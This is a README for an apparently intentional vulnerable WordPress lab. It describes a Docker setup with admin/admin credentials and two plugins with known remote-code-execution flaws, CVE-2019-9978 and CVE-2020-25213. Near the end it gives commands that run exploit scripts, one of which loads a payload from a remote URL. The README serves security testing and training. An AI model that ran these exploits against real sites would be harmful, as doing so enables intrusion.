# WordPress Vulnerable Environment

This directory contains everything needed for the automated WordPress vulnerable environment setup.

## Directory Structure

```
wordpress/
├── Dockerfile                    # Custom WordPress image with WP-CLI
├── custom-entrypoint.sh          # Entrypoint that starts plugin auto-installation
├── install-plugins.sh            # Auto-installs and activates vulnerable plugins
├── auto-install-wp.sh           # Auto-installs WordPress core with weak credentials
├── exploits/                    # Exploitation scripts for testing vulnerabilities
│   ├── cve-2019-9978-remote.py
│   ├── cve-2020-25213-file-manager-rce.py
│   └── weak-credentials-exploit.py
└── vulnerable-plugins/          # Vulnerable WordPress plugins
    ├── social-warfare/          # Social Warfare v3.5.2 (CVE-2019-9978)
    └── wp-file-manager/         # WP File Manager v6.0 (CVE-2020-25213)
```

## How It Works

1. **Build**: Docker builds the custom WordPress image with WP-CLI
2. **Start**: Container starts with `custom-entrypoint.sh`
3. **Auto-Install**: `install-plugins.sh` runs in background, waiting for WordPress core
4. **Deploy Script**: `auto-install-wp.sh` is called by deploy.sh to install WordPress
5. **Plugins**: Once WordPress is ready, plugins are automatically copied and activated

## Automated Setup

The entire setup is automated when you run:
```bash
./scripts/deploy.sh
```

This will:
- Build WordPress container with WP-CLI
- Install WordPress at `http://wordpress.tujuh`
- Install and activate both vulnerable plugins
- Set correct permissions for plugin operations

## Credentials

- **URL**: http://wordpress.tujuh (or http://localhost:8080)
- **Username**: admin
- **Password**: admin

## Vulnerable Plugins

### 1. Social Warfare v3.5.2
- **CVE**: CVE-2019-9978
- **Type**: Remote Code Execution (RCE)
- **Description**: Unauthenticated RCE via payload injection

### 2. WP File Manager v6.0
- **CVE**: CVE-2020-25213
- **Type**: Remote Code Execution (RCE)
- **Description**: Unauthenticated file upload allowing RCE

## Testing Exploits

Run exploitation tests from the main directory:

```bash
# CVE-2020-25213 (File Manager RCE)
python3 wordpress/exploits/cve-2020-25213-file-manager-rce.py http://wordpress.tujuh

# CVE-2019-9978 (Social Warfare RCE)
python3 wordpress/exploits/cve-2019-9978-remote.py http://wordpress.tujuh \
  --payload-url https://your-payload-url/payload.txt
```

⚠️ **WARNING**: These plugins contain real vulnerabilities. Use only in isolated testing environments!
